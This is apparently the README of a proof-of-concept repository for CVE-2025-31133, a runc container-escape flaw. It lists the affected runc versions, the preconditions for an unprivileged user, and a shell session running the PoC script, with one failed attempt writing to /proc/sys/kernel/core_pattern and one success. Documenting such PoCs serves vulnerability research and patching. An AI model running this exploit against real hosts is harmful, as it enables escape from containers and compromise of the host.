# Assumptions

- Host runs [vulnerable](https://www.cve.org/CVERecord?id=CVE-2025-31133) version of runc: `1.2.7` and below, `1.3.0-rc.1` through `1.3.2`, `1.4.0-rc.1` and `1.4.0-rc.2`.
- Unprivileged user is able to create containers with `runc` (or containerd's `ctr`) from OCI configuration file and plain rootfs.

# Usage

```shellsession
you@yourhost:container-escape-ebpf$ make build run exec
b11285af78f6:/# su unprivileged
b11285af78f6:/$ cd
b11285af78f6:~$ python3 /cve-2025-31133-poc.py
Launched container: axXjevWaJ1deK3OuharhsOZrK0FsrEUh
/bin/sh: can't create /proc/sys/kernel/core_pattern: Read-only file system
Exploit did not succeed. Try again.
b11285af78f6:~$ python3 /cve-2025-31133-poc.py
Launched container: J3vwzaXv5DOfCEciwQiAAUHMuAb8sZXe
Exploit succeeded!
```
